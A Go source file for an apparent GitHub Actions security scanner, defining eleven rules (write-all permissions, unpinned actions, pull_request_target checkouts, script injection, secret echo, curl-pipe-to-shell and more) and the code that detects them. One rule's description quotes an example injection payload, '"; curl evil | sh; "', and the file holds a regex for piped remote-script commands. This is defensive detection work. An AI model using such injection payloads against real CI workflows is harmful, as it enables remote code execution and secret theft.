package workflows

import (
	"fmt"
	"regexp"
	"strings"

	"github.com/Undrocs/wardline/internal/findings"
	"github.com/Undrocs/wardline/internal/security"
)

// rule describes one GitHub Actions check.
type rule struct {
	ID          string
	Title       string
	Description string
	Impact      string
	Remediation string
	References  []string
	Severity    findings.Severity
	Confidence  findings.Confidence
}

var (
	ruleExcessivePermissions = rule{
		ID: "WL-WF001", Title: "Workflow grants write-all token permissions",
		Description: "The workflow sets `permissions: write-all`, giving the GITHUB_TOKEN every write scope.",
		Impact:      "Any step, including third-party actions and scripts that process untrusted input, can push code, edit releases, modify issues or escalate within the repository.",
		Remediation: "Replace `write-all` with the minimum scopes required by each job (often `contents: read`).",
		References:  []string{"https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token"},
		Severity:    findings.SeverityHigh, Confidence: findings.ConfidenceHigh,
	}
	ruleMissingPermissions = rule{
		ID: "WL-WF002", Title: "Workflow does not restrict token permissions",
		Description: "The workflow has no top-level `permissions` block, so the GITHUB_TOKEN inherits whatever default the repository or organisation has configured.",
		Impact:      "When the default is read/write (still common for older repositories), compromised steps or third-party actions receive write access they do not need.",
		Remediation: "Declare an explicit `permissions:` block, starting from `contents: read` and adding scopes per job only where required.",
		References:  []string{"https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token"},
		Severity:    findings.SeverityLow, Confidence: findings.ConfidenceMedium,
	}
	ruleWritePermission = rule{
		ID: "WL-WF003", Title: "Workflow requests a write permission",
		Description: "A workflow or job grants a write scope to the GITHUB_TOKEN.",
		Impact:      "A write scope expands what an attacker gains from a compromised step or a script injection flaw in the same workflow.",
		Remediation: "Keep write scopes on the narrowest possible job, after the untrusted work, and prefer `permissions: {}` plus the specific scope needed.",
		References:  []string{"https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token"},
		Severity:    findings.SeverityMedium, Confidence: findings.ConfidenceMedium,
	}
	ruleUnpinnedAction = rule{
		ID: "WL-WF004", Title: "Action is not pinned to a commit SHA",
		Description: "An action is referenced by a tag, branch or floating reference instead of a full commit SHA.",
		Impact:      "The referenced repository owner can move the tag to new code, so the workflow executes code that was never reviewed.",
		Remediation: "Pin every action to a full 40-character commit SHA and let a dependency bot update the pin.",
		References:  []string{"https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions"},
		Severity:    findings.SeverityMedium, Confidence: findings.ConfidenceHigh,
	}
	rulePullRequestTarget = rule{
		ID: "WL-WF005", Title: "Workflow runs on pull_request_target",
		Description: "The workflow is triggered by `pull_request_target`, which runs with the base repository's permissions and secrets, in the context of untrusted pull requests.",
		Impact:      "Any use of pull request content in this workflow can expose secrets or the write-scoped token to an attacker-controlled pull request.",
		Remediation: "Prefer `pull_request`. If `pull_request_target` is required (for labelling or commenting), never check out or execute the pull request's code and do not use its content in shells.",
		References: []string{
			"https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#preventing-pwn-requests",
		},
		Severity: findings.SeverityHigh, Confidence: findings.ConfidenceHigh,
	}
	rulePrivilegedCheckout = rule{
		ID: "WL-WF006", Title: "Workflow executes untrusted pull request code with privileged access",
		Description: "A `pull_request_target` workflow checks out the pull request head, so attacker-controlled code runs with the base repository's token and secrets.",
		Impact:      "A malicious pull request can exfiltrate secrets and push commits without review. This is the classic GitHub Actions privilege-escalation pattern.",
		Remediation: "Do not check out `github.event.pull_request.head.*` or `github.head_ref` under `pull_request_target`. Split privileged and unprivileged work into separate workflows, or use `pull_request` with minimal permissions.",
		References:  []string{"https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/"},
		Severity:    findings.SeverityCritical, Confidence: findings.ConfidenceHigh,
	}
	ruleScriptInjection = rule{
		ID: "WL-WF007", Title: "Untrusted input interpolated into a shell command",
		Description: "A `${{ }}` expression containing attacker-controlled event data is expanded directly inside a `run:` script.",
		Impact:      "An attacker can break out of the intended command and execute arbitrary shell commands, for example by putting `\"; curl evil | sh; \"` in a pull request title.",
		Remediation: "Pass the value through an `env:` variable and reference it as a quoted shell variable (`\"$TITLE\"`), never inside `${{ }}` in the script body.",
		References:  []string{"https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections"},
		Severity:    findings.SeverityHigh, Confidence: findings.ConfidenceHigh,
	}
	ruleSecretEcho = rule{
		ID: "WL-WF008", Title: "Secret may be written to workflow logs",
		Description: "A `run:` script echoes a value from `secrets`, which can print the secret into a log that is visible to anyone with repository read access.",
		Impact:      "Logs are retained and often readable by more people than the secret store; leaked secrets must be rotated.",
		Remediation: "Never echo secrets. Compute a checksum or use masked values instead, and remember that GitHub masking is best-effort and not a security control.",
		References:  []string{"https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#mitigating-the-risks-of-untrusted-code"},
		Severity:    findings.SeverityHigh, Confidence: findings.ConfidenceMedium,
	}
	ruleArtifactTrust = rule{
		ID: "WL-WF009", Title: "Privileged workflow consumes artifacts from an untrusted run",
		Description: "A workflow triggered by `workflow_run` downloads artifacts produced by a less privileged run.",
		Impact:      "An attacker who can influence the earlier workflow (for example through a pull request) can place files in the artifact and have them used in a privileged context.",
		Remediation: "Treat artifacts as untrusted input: do not execute them, validate their contents, and avoid privileged triggers for workflows that consume artifacts from fork runs.",
		References:  []string{"https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#mitigating-the-risks-of-untrusted-code"},
		Severity:    findings.SeverityHigh, Confidence: findings.ConfidenceHigh,
	}
	ruleSelfHosted = rule{
		ID: "WL-WF010", Title: "Self-hosted runner used for untrusted pull requests",
		Description: "A workflow triggered by pull requests runs on a self-hosted runner.",
		Impact:      "Pull request code runs on a persistent host that may hold credentials, caches and network access beyond the workflow's sandbox.",
		Remediation: "Do not run untrusted pull request code on self-hosted runners, or use ephemeral, network-isolated runner instances with no persistent state.",
		References:  []string{"https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security"},
		Severity:    findings.SeverityMedium, Confidence: findings.ConfidenceMedium,
	}
	ruleRemoteScript = rule{
		ID: "WL-WF011", Title: "Remote script piped into a shell",
		Description: "A `run:` step downloads a script and pipes it directly into a shell interpreter.",
		Impact:      "Whatever the remote server returns executes in CI, with the workflow's token, secrets and network access, and without any integrity check.",
		Remediation: "Download the script, verify a published checksum or signature, and execute the verified file. Pin the version you verify.",
		References:  []string{"https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions"},
		Severity:    findings.SeverityMedium, Confidence: findings.ConfidenceHigh,
	}
)

var remoteScriptPattern = regexp.MustCompile(`(?i)\b(?:curl|wget)\b[^\n|;]*\|\s*(?:sudo\s+)?(?:ba|z|k)?sh\b`)

// workflow is the analysed view of a workflow file.
type workflow struct {
	File        string
	Root        *node
	Triggers    map[string]bool
	Permissions *node
	Jobs        []*job
}

type job struct {
	ID          string
	Line        int
	Node        *node
	Permissions *node
	Steps       []*step
}

type step struct {
	Index int
	Line  int
	Node  *node
}

// parseTriggers extracts the set of triggers from the `on:` key.
func parseTriggers(root *node) map[string]bool {
	out := map[string]bool{}
	on, ok := root.Get("on")
	if !ok {
		// YAML 1.1 parsers may treat the unquoted `on` key as a boolean; the
		// workflow is unparseable for our purposes rather than assumed safe.
		return out
	}
	switch on.Kind {
	case kindScalar, kindBlock:
		for _, name := range strings.Split(on.Value, ",") {
			name = strings.TrimSpace(name)
			if name != "" {
				out[strings.ToLower(name)] = true
			}
		}
	case kindSequence:
		for _, item := range on.Items {
			if v, ok := item.Scalar(); ok {
				out[strings.ToLower(strings.TrimSpace(v))] = true
			}
		}
	case kindMapping:
		for _, p := range on.Pairs {
			out[strings.ToLower(p.Key)] = true
		}
	}
	return out
}

func buildWorkflow(file string, root *node) *workflow {
	wf := &workflow{File: file, Root: root, Triggers: parseTriggers(root)}
	wf.Permissions, _ = root.Get("permissions")
	if jobsNode, ok := root.Get("jobs"); ok && jobsNode.Kind == kindMapping {
		for _, p := range jobsNode.Pairs {
			if p.Value == nil || p.Value.Kind != kindMapping {
				continue
			}
			j := &job{ID: p.Key, Line: p.KeyLine, Node: p.Value}
			j.Permissions, _ = p.Value.Get("permissions")
			if stepsNode, ok := p.Value.Get("steps"); ok {
				for i, item := range stepsNode.Seq() {
					j.Steps = append(j.Steps, &step{Index: i, Line: item.Line, Node: item})
				}
			}
			wf.Jobs = append(wf.Jobs, j)
		}
	}
	return wf
}

// permissionsAt returns the effective permission mapping for a job, falling back
// to the workflow level.
func (wf *workflow) permissionsAt(j *job) (*node, string, bool) {
	if j != nil && j.Permissions != nil {
		return j.Permissions, fmt.Sprintf("jobs.%s.permissions", j.ID), true
	}
	if wf.Permissions != nil {
		return wf.Permissions, "permissions", true
	}
	return nil, "", false
}

// checkPermissions applies the token-permission rules.
func checkPermissions(wf *workflow) []findings.Finding {
	var out []findings.Finding
	if wf.Permissions == nil {
		out = append(out, newFinding(ruleMissingPermissions, wf.File, 1, "permissions",
			"Workflow has no top-level permissions block"))
	} else if v, ok := wf.Permissions.Scalar(); ok {
		if strings.EqualFold(strings.TrimSpace(v), "write-all") {
			out = append(out, newFinding(ruleExcessivePermissions, wf.File, wf.Permissions.Line, "permissions",
				"permissions: write-all"))
		}
	}
	// A write scope at workflow level applies to every job, including jobs that
	// never need it. A write scope on a single job is the documented
	// least-privilege pattern, so it is only reported when the workflow can be
	// driven by untrusted events.
	untrusted := hasUntrustedTrigger(wf.Triggers)
	check := func(scope string, perm *node, jobScoped bool) {
		if perm == nil {
			return
		}
		if jobScoped && !untrusted {
			return
		}
		if v, ok := perm.Scalar(); ok {
			if strings.EqualFold(strings.TrimSpace(v), "write-all") && !findingsContain(out, ruleExcessivePermissions.ID, perm.Line) {
				out = append(out, newFinding(ruleExcessivePermissions, wf.File, perm.Line, scope,
					"permissions: write-all"))
			}
			return
		}
		if perm.Kind != kindMapping {
			return
		}
		for _, p := range perm.Pairs {
			value, ok := p.Value.Scalar()
			if !ok || !strings.EqualFold(strings.TrimSpace(value), "write") {
				continue
			}
			if p.Key == "id-token" || p.Key == "attestations" {
				// OIDC token minting and attestations are not repository writes.
				continue
			}
			out = append(out, newFinding(ruleWritePermission, wf.File, p.KeyLine,
				scope+"."+p.Key,
				fmt.Sprintf("%s: write", p.Key)))
		}
	}
	check("permissions", wf.Permissions, false)
	for _, j := range wf.Jobs {
		check(fmt.Sprintf("jobs.%s.permissions", j.ID), j.Permissions, true)
	}
	return out
}

// untrustedTriggers are events whose payload can be influenced by someone
// outside the repository.
var untrustedTriggers = []string{
	"pull_request", "pull_request_target", "pull_request_review",
	"pull_request_review_comment", "issues", "issue_comment",
	"discussion", "discussion_comment", "workflow_run", "repository_dispatch",
	"workflow_call",
}

// hasUntrustedTrigger reports whether any trigger can carry attacker-controlled
// input.
func hasUntrustedTrigger(triggers map[string]bool) bool {
	for _, name := range untrustedTriggers {
		if triggers[name] {
			return true
		}
	}
	return false
}

func findingsContain(list []findings.Finding, ruleID string, line int) bool {
	for _, f := range list {
		if f.RuleID == ruleID && f.Location.StartLine == line {
			return true
		}
	}
	return false
}

// checkActions applies the action-pinning rules.
func checkActions(wf *workflow) []findings.Finding {
	var out []findings.Finding
	for _, j := range wf.Jobs {
		for _, s := range j.Steps {
			usesNode, ok := s.Node.Get("uses")
			if !ok {
				continue
			}
			uses, ok := usesNode.Scalar()
			if !ok {
				continue
			}
			uses = strings.TrimSpace(uses)
			if uses == "" {
				continue
			}
			locator := fmt.Sprintf("jobs.%s.steps[%d].uses", j.ID, s.Index)
			if strings.HasPrefix(uses, "./") || strings.HasPrefix(uses, ".\\") {
				continue // local composite action, covered by repository review
			}
			if strings.HasPrefix(uses, "docker://") {
				if !strings.Contains(uses, "@sha256:") {
					f := newFinding(ruleUnpinnedAction, wf.File, usesNode.Line, locator,
						"Container action is not pinned by digest: "+uses)
					out = append(out, f)
				}
				continue
			}
			at := strings.LastIndex(uses, "@")
			if at < 0 || at == len(uses)-1 {
				out = append(out, newFinding(ruleUnpinnedAction, wf.File, usesNode.Line, locator,
					"Action reference has no version: "+uses))
				continue
			}
			owner := strings.ToLower(uses[:at])
			ref := uses[at+1:]
			if isFullSHA(ref) {
				continue
			}
			f := newFinding(ruleUnpinnedAction, wf.File, usesNode.Line, locator,
				"Action reference is not pinned to a commit SHA: "+uses)
			switch {
			case isBranchRef(ref):
				f.Severity = findings.SeverityHigh
			case strings.HasPrefix(owner, "actions/"), strings.HasPrefix(owner, "github/"):
				f.Severity = findings.SeverityLow
			}
			out = append(out, f)
		}
	}
	return out
}

func isFullSHA(ref string) bool {
	if len(ref) != 40 {
		return false
	}
	for i := 0; i < len(ref); i++ {
		c := ref[i]
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
			return false
		}
	}
	return true
}

func isBranchRef(ref string) bool {
	switch strings.ToLower(ref) {
	case "main", "master", "head", "develop", "development", "trunk", "latest":
		return true
	}
	return false
}

// checkTriggers applies the trigger-related rules.
func checkTriggers(wf *workflow) []findings.Finding {
	var out []findings.Finding
	if !wf.Triggers["pull_request_target"] {
		return out
	}
	on, _ := wf.Root.Get("on")
	line := 1
	if on != nil {
		line = on.Line
	}
	out = append(out, newFinding(rulePullRequestTarget, wf.File, line, "on.pull_request_target",
		"Workflow is triggered by pull_request_target"))

	for _, j := range wf.Jobs {
		for _, s := range j.Steps {
			usesNode, ok := s.Node.Get("uses")
			if !ok {
				continue
			}
			uses, _ := usesNode.Scalar()
			if !strings.Contains(strings.ToLower(uses), "actions/checkout") {
				continue
			}
			ref := ""
			if with, ok := s.Node.Get("with"); ok {
				if refNode, ok := with.Get("ref"); ok {
					ref, _ = refNode.Scalar()
				}
			}
			lower := strings.ToLower(strings.ReplaceAll(ref, " ", ""))
			if strings.Contains(lower, "github.event.pull_request.head") || strings.Contains(lower, "github.head_ref") {
				out = append(out, newFinding(rulePrivilegedCheckout, wf.File, usesNode.Line,
					fmt.Sprintf("jobs.%s.steps[%d]", j.ID, s.Index),
					"Checks out pull request head under pull_request_target (ref: "+truncateForEvidence(ref, 80)+")"))
			}
		}
	}
	return out
}

// checkSteps applies rules that need to inspect run scripts and runner labels.
func checkSteps(wf *workflow) []findings.Finding {
	var out []findings.Finding
	privilegedArtifactTrigger := wf.Triggers["workflow_run"]
	untrustedTrigger := wf.Triggers["pull_request"] || wf.Triggers["pull_request_target"]

	for _, j := range wf.Jobs {
		if runsOn, ok := j.Node.Get("runs-on"); ok {
			labels := collectScalars(runsOn)
			for _, label := range labels {
				if strings.Contains(strings.ToLower(label), "self-hosted") && untrustedTrigger {
					out = append(out, newFinding(ruleSelfHosted, wf.File, runsOn.Line,
						fmt.Sprintf("jobs.%s.runs-on", j.ID),
						"Self-hosted runner: "+truncateForEvidence(label, 60)))
					break
				}
			}
		}
		for _, s := range j.Steps {
			baseLocator := fmt.Sprintf("jobs.%s.steps[%d]", j.ID, s.Index)
			usesNode, hasUses := s.Node.Get("uses")
			if hasUses {
				uses, _ := usesNode.Scalar()
				if privilegedArtifactTrigger && strings.Contains(strings.ToLower(uses), "download-artifact") {
					out = append(out, newFinding(ruleArtifactTrust, wf.File, usesNode.Line, baseLocator+".uses",
						"Privileged workflow_run downloads artifacts: "+truncateForEvidence(uses, 80)))
				}
			}
			runNode, hasRun := s.Node.Get("run")
			if !hasRun {
				continue
			}
			script, _ := runNode.Scalar()
			if strings.TrimSpace(script) == "" {
				continue
			}
			lines := strings.Split(script, "\n")
			for i, lineText := range lines {
				lineNo := runNode.Line + i
				if runNode.Kind == kindBlock {
					lineNo = runNode.BlockLineOffset(i)
				}
				if expr, ok := firstUntrustedExpression(lineText); ok {
					out = append(out, newFinding(ruleScriptInjection, wf.File, lineNo,
						fmt.Sprintf("%s.run[%d]", baseLocator, i),
						"Untrusted expression in run script: ${{ "+truncateForEvidence(expr, 80)+" }}"))
				}
				if remoteScriptPattern.MatchString(lineText) {
					out = append(out, newFinding(ruleRemoteScript, wf.File, lineNo,
						fmt.Sprintf("%s.run[%d].remote", baseLocator, i),
						"Remote script piped to shell: "+truncateForEvidence(strings.TrimSpace(lineText), 90)))
				}
				if looksLikeSecretEcho(lineText) {
					out = append(out, newFinding(ruleSecretEcho, wf.File, lineNo,
						fmt.Sprintf("%s.run[%d].secret", baseLocator, i),
						"Secret value echoed in run script"))
				}
			}
		}
	}
	return out
}

func collectScalars(n *node) []string {
	var out []string
	n.WalkScalars(func(s *node) {
		if v := strings.TrimSpace(s.Value); v != "" {
			out = append(out, v)
		}
	})
	return out
}

// untrustedPrefixes are event fields GitHub documents as attacker controlled.
var untrustedPrefixes = []string{
	"github.event.pull_request.title",
	"github.event.pull_request.body",
	"github.event.pull_request.head.ref",
	"github.event.pull_request.head.label",
	"github.event.pull_request.head.repo",
	"github.event.issue.title",
	"github.event.issue.body",
	"github.event.comment.body",
	"github.event.review.body",
	"github.event.review_comment.body",
	"github.event.discussion.title",
	"github.event.discussion.body",
	"github.event.head_commit.message",
	"github.event.head_commit.author.name",
	"github.event.head_commit.author.email",
	"github.event.workflow_run.head_branch",
	"github.event.workflow_run.head_commit.message",
	"github.head_ref",
	"github.event.client_payload",
}

// dangerousIndexedPatterns match attacker-controlled fields that are reached
// through an index expression, which a prefix match cannot cover.
var dangerousIndexedPatterns = []string{
	"github.event.commits[",
	"github.event.pages[",
	"github.event.workflow_run.pull_requests[",
}

var expressionPattern = regexp.MustCompile(`\$\{\{([^}]*)\}\}`)

// firstUntrustedExpression returns the first untrusted expression in a script line.
func firstUntrustedExpression(line string) (string, bool) {
	for _, m := range expressionPattern.FindAllStringSubmatch(line, 4) {
		expr := strings.TrimSpace(m[1])
		if isUntrustedExpression(expr) {
			return expr, true
		}
	}
	return "", false
}

// isUntrustedExpression reports whether an expression contains attacker-controlled
// event data. Trusted fields such as github.sha, github.repository and
// github.event.pull_request.base.ref are deliberately excluded.
func isUntrustedExpression(expr string) bool {
	e := strings.ToLower(strings.ReplaceAll(expr, " ", ""))
	if e == "" {
		return false
	}
	for _, prefix := range untrustedPrefixes {
		if strings.HasPrefix(e, prefix) {
			return true
		}
		// Expressions are often wrapped in functions such as format(...).
		if strings.Contains(e, prefix+".") || strings.Contains(e, prefix+"[") || strings.Contains(e, prefix+")") {
			return true
		}
	}
	for _, pattern := range dangerousIndexedPatterns {
		if strings.Contains(e, pattern) {
			for _, tail := range []string{".message", ".author.name", ".author.email", "page_name", ".head.ref", ".title", ".body"} {
				if strings.Contains(e, tail) {
					return true
				}
			}
		}
	}
	return false
}

// looksLikeSecretEcho detects commands that print secrets into the log.
func looksLikeSecretEcho(line string) bool {
	lower := strings.ToLower(line)
	if !strings.Contains(lower, "secrets.") && !strings.Contains(lower, "${{ secrets") {
		return false
	}
	for _, cmd := range []string{"echo", "printf", "print(", "cat <<", "tee ", "env", "printenv"} {
		if strings.Contains(lower, cmd) {
			return true
		}
	}
	return false
}

func truncateForEvidence(s string, max int) string {
	s = strings.ReplaceAll(strings.ReplaceAll(s, "\n", " "), "\r", " ")
	if len(s) <= max {
		return s
	}
	return s[:max] + "…"
}

// newFinding builds a workflow finding with a stable structural locator.
func newFinding(r rule, file string, line int, locator, evidence string) findings.Finding {
	return findings.New(findings.Finding{
		RuleID:      r.ID,
		Scanner:     findings.ScannerWorkflows,
		Title:       r.Title,
		Severity:    r.Severity,
		Confidence:  r.Confidence,
		Location:    findings.Location{Path: file, StartLine: line},
		Evidence:    security.SanitizeEvidence(evidence, 200),
		Description: r.Description,
		Impact:      r.Impact,
		Remediation: r.Remediation,
		References:  r.References,
		Locator:     locator,
	})
}

// Catalog exposes rule metadata for documentation and tests.
func Catalog() []rule {
	return []rule{
		ruleExcessivePermissions, ruleMissingPermissions, ruleWritePermission,
		ruleUnpinnedAction, rulePullRequestTarget, rulePrivilegedCheckout,
		ruleScriptInjection, ruleSecretEcho, ruleArtifactTrust, ruleSelfHosted,
		ruleRemoteScript,
	}
}
